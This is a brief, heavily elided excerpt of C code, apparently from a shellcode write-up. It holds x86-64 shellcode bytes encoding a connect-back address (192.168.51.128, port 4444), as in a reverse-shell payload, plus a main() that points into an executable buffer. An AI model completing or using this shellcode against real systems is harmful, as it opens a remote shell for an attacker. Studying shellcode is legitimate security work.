...
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x33\x80\x41\x54"
...
int main(void) {
	...
	unsigned char *code_entry = (unsigned char *)exec + 0;
	unsigned char *embedded_string = (unsigned char *)exec + 4;
